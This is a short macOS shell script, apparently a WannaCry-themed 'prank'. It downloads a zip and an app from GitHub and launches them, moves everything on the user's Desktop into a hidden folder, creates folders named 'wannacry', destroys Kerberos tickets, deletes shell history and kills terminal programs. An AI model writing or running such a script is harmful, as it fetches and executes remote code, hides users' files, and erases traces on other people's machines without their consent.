if [ $(users) == "aaskal" ]
then
    echo "wa ta sir thwa"
    exit 1
fi  # replace 'done' with 'fi'

# rest of the script...

mkdir -p /tmp/laz/

git clone  https://github.com/aabderrafie/wannacry/blob/master/app.zip -o /tmp/laz/prank.tar.gz > /dev/null

cd /tmp
rm -rf sound
git clone  https://github.com/aabderrafie/sound  
cd sound
open ./sound.app

tar xvf /tmp/laz/prank.tar.gz -C /tmp/laz > /dev/null

mkdir ~/.Laz/

mv ~/Desktop/* ~/.Laz/

cd ~/tmp

rm -rf ~/.*history*

mkdir wannacry{0..10}

nohup open /tmp/laz/app/Laz.app > /dev/null

kdestroy
clear
rm -f ~/.*history*

killall iTerm
killall Terminal
killall iTerm2